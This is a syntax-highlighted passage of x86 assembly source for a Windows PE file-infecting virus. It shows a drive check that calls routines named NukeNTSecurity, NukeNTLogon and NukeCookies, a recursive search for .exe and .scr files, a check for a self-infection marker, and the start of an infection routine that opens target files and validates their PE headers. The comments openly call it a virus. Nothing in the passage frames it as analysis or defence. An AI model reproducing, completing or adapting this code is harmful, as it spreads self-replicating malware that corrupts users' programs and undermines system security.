</span><span class="sc1">; this function justs checks if the disk can be infected</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">InfectDisk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">005C3A3F</span><span class="sc0">            </span><span class="sc1">; '?:\',0</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">GetDriveTypeA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">                  </span><span class="sc1">; no drive</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SkipDisk</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                  </span><span class="sc1">; floppy disk</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SkipDisk</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">                  </span><span class="sc1">; cd-rom</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SkipDisk</span><span class="sc0">

</span><span class="sc1">; if you know the type of the zip drive, please put it here</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            cmp          eax,??                  ; zip drive</span><span class="sc0">
</span><span class="sc1">;            jz           short SkipDisk</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; These 3 functions make this virus quite useful :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NukeNTSecurity</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NukeNTLogon</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">NukeCookies</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; now go on with the infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartSearch</span><span class="sc0">

</span><span class="sc5">SkipDisk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; recursive search routine</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">StartSearch</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">CDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">002A2E2A</span><span class="sc0">  </span><span class="sc1">; '*.*'</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; start searching for files located in CurrentDir</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindFirstFileA</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AccessOk</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">AccessOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">FileTest</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; FindFile structure :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    + 00 : File Attributs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    + 04 : CreationTime</span><span class="sc0">
</span><span class="sc1">;    + 0C : LastAccessTime</span><span class="sc0">
</span><span class="sc1">;    + 14 : LastWriteTime</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    + 20 : File Size</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    + 2C : File Name</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2C</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc5">NextFile</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; al = file attributes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; bit 0 : read-only</span><span class="sc0">
</span><span class="sc1">;     1 : hidden</span><span class="sc0">
</span><span class="sc1">;     2 : system</span><span class="sc0">
</span><span class="sc1">;     4 : directory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">         </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">IsFileOk</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; search through the new directory</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">CDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">AddDir</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">AddDir</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">             </span><span class="sc6">stosb</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">CDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">StartSearch</span><span class="sc0">

             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">CDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

             </span><span class="sc6">jmp</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; to be infectable, the file must conform to the requirements :</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; - the extent has to be .exe or .scr</span><span class="sc0">
</span><span class="sc1">; - its size must be &gt;= 16384</span><span class="sc0">
</span><span class="sc1">; - it shouldn't be already infected</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">IsFileOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">

</span><span class="sc5">GetFileExtent</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetFileExtent</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20202020</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' exe'</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Executable</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">' rcs'</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">                   

</span><span class="sc5">Executable</span><span class="sc4">:</span><span class="sc0">
             
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4000</span><span class="sc0">                  </span><span class="sc1">; minimum filesize</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; FileDate</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">                                  
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">      </span><span class="sc1">; CreationTime</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FileTimeToDosDateTime</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">            </span><span class="sc1">; no CreationTime</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The program has been infected if CreationTime verifies :</span><span class="sc0">
</span><span class="sc1">; (seconds and 0F) xor (days and 0F) = self-infection mask</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">FileTime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">FileDate</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">and</span><span class="sc0">          </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0F</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">SelF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">jz</span><span class="sc0">           </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NextFile</span><span class="sc0">

             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">InfectFile</span><span class="sc0">

</span><span class="sc5">NextFile</span><span class="sc4">:</span><span class="sc0">             

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B1A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindNextFileA</span><span class="sc0">

             </span><span class="sc6">or</span><span class="sc0">           </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">FileTest</span><span class="sc0">

</span><span class="sc5">EndSearch</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearchHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">FindClose</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; concatenate the current directory and the file name</span><span class="sc0">
</span><span class="sc1">; to get the full pathname</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CurrentDir</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">CDirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0">          </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
             </span><span class="sc6">repz</span><span class="sc0">         </span><span class="sc6">movsb</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2C</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">VS</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

</span><span class="sc5">GetFileName</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">GetFileName</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">02</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lopen</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">OpenOk</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OpenOk</span><span class="sc4">:</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; read the file header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc2">800</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">         </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0">         </span><span class="sc5">_lread</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">B2A</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; check if the file is a standard PE (Portable Executable) program</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; DOS EXE Signature</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">       </span><span class="sc1">; DOS EXE</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Windows Executable (can be a NE or a PE)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">0040</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; make sure the DOS header is not too big</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3C</span><span class="sc4">],</span><span class="sc2">0400</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ebx points to the start of the PE header</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3C</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; check the PE signature</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">00004550</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 386-compatible processors</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">014C</span><span class="sc0">
             </span><span class="sc6">jc</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc4">],</span><span class="sc2">014F</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0">           </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; it is very important no to infect native subsystem programs</span><span class="sc0">
</span><span class="sc1">; which are loaded before the kernel32, like ntoskrnl</span><span class="sc0">
</span><span class="sc1">; or programs which run in the character subsystem, especially</span><span class="sc0">
</span><span class="sc1">; ntvdm, which is verified when the system starts</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">cmp</span><span class="sc0">          </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5C</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">          </span><span class="sc5">ExitInfect</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; esi contains the first section offset</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

             </span><span class="sc6">mov</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0">          </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">18</span><span class="sc0">
